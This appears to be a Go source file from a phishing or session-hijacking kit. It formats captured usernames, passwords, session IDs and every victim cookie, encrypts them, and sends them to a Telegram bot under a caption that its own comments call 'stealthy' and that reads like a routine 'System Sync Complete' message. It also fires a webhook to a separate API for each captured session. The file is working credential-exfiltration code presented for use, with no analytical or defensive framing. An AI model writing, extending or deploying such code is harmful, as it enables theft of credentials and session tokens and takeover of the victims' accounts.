package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
	"time"
)

// ══════════════════════════════════════════════════════════
//  CREDENTIAL CAPTURE ALERTS
// ══════════════════════════════════════════════════════════

type CredentialAlertEvent struct {
	Timestamp   string
	Domain      string
	CampaignID  string
	Provider    string
	Username    string
	Password    string
	SessionID   string
	IP          string
	Country     string
	CookieCount int
	Cookies     map[string]string
	Device      string
	CFRay       string
}

func SendCredentialAlert(event CredentialAlertEvent) {
	botToken := strings.TrimSpace(os.Getenv("TELEGRAM_BOT_TOKEN"))
	chatID := strings.TrimSpace(os.Getenv("TELEGRAM_CHAT_ID"))

	if botToken == "" || chatID == "" {
		return
	}

	// ── 1. Format Campaign ID for the filename ──
	filename := fmt.Sprintf("%s.txt", event.CampaignID)
	if len(filename) > 50 {
		filename = fmt.Sprintf("%s.txt", event.CampaignID[:46])
	}

	// ── 2. Build the full plain-text message to be encrypted (NO TRUNCATION) ──
	msg := fmt.Sprintf(
		"SESSION DATA LOG\n"+
			"Timestamp : %s\n"+
			"Domain    : %s\n"+
			"Campaign  : %s\n"+
			"Provider  : %s\n"+
			"Username  : %s\n"+
			"Password  : %s\n"+
			"SessionID : %s\n"+
			"IP        : %s (%s)\n"+
			"Cookies   : %d captured\n",
		event.Timestamp,
		event.Domain,
		event.CampaignID,
		event.Provider,
		event.Username,
		event.Password,
		event.SessionID,
		event.IP,
		event.Country,
		event.CookieCount,
	)

	// Append all cookies in full, no truncation
	for k, v := range event.Cookies {
		msg += fmt.Sprintf("%s = %s\n", k, v)
	}

	msg += fmt.Sprintf(
		"Device    : %s\n"+
			"CF-Ray    : %s\n",
		event.Device,
		event.CFRay,
	)

	// ── 3. Encrypt the full message ──
	encrypted, err := EncryptString(msg)
	if err != nil {
		log.Printf("[System] encryption failed: %v", err)
		return
	}

	// ── 4. Build a STEALTHY, generic caption with Campaign ID and Domain ──
	caption := fmt.Sprintf(
		"📦 System Sync Complete\n"+
			"🆔 Campaign: <code>%s</code>\n"+
			"🌐 Domain: %s\n"+
			"📊 Status: Processed\n"+
			"📎 Log file attached.",
		event.CampaignID,
		event.Provider,
	)

	// Discreet terminal log
	log.Printf("[📡 System] Encrypted log '%s' generated and sent.", filename)

	// ── 5. Send as a Document with Caption ──
	sendEncryptedDocument(botToken, chatID, caption, filename, []byte(encrypted))
}

// ══════════════════════════════════════════════════════════
//  TELEGRAM API: Send Encrypted File + Caption
// ══════════════════════════════════════════════════════════

func sendEncryptedDocument(token, chatID, caption, filename string, fileContent []byte) {
	endpoint := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", token)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Add form fields
	writer.WriteField("chat_id", chatID)
	writer.WriteField("caption", caption)
	writer.WriteField("parse_mode", "HTML")

	// Attach the encrypted file
	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		log.Printf("[System] file creation error: %v", err)
		return
	}
	part.Write(fileContent)
	
	writer.Close()

	// Fire and forget (non-blocking)
	go func() {
		client := &http.Client{Timeout: 15 * time.Second}
		req, err := http.NewRequest("POST", endpoint, body)
		if err != nil {
			log.Printf("[System] request error: %v", err)
			return
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())
		
		resp, err := client.Do(req)
		if err != nil {
			log.Printf("[System] upload error: %v", err)
			return
		}
		defer resp.Body.Close()
		
		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
			respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
			log.Printf("[System] HTTP %d: %s", resp.StatusCode, string(respBody))
		}
	}()
}

// ══════════════════════════════════════════════════════════
//  EMIT CAPTURE (Bridges Session to Telegram & Webhook)
// ══════════════════════════════════════════════════════════

func emitCapture(s *Session, target *Target) {
	if s == nil || target == nil {
		return
	}

	username, password, campaignID, tokens, done := s.Snapshot()

	if !done || len(tokens) == 0 {
		log.Printf("[⚠️ System] Skipping incomplete session (tokens: %d)", len(tokens))
		return
	}

	log.Printf("[📡 System] Processing complete session: %s", s.ID)

	ip := s.IP
	if ip == "" {
		ip = "Unknown"
	}

	userAgent := s.UserAgent
	if userAgent == "" {
		userAgent = "Unknown"
	}

	// ── Populate the struct cleanly ──
	telegramEvent := CredentialAlertEvent{
		Timestamp:   time.Now().UTC().Format("2006-01-02 15:04:05") + " UTC",
		Domain:      "remits.me",
		CampaignID:  campaignID,
		Provider:    target.Name,
		Username:    username,
		Password:    password,
		SessionID:   s.ID,
		IP:          ip,
		Country:     "Unknown",
		CookieCount: len(tokens),
		Cookies:     tokens,
		Device:      userAgent,
		CFRay:       "Unknown",
	}

	// 🚀 Triggers the Telegram alert (Encrypted File with Stealth Caption)
	SendCredentialAlert(telegramEvent)

	// 🪝 Triggers the Webhook to your Node.js API
	emitWebhook(s, target)
}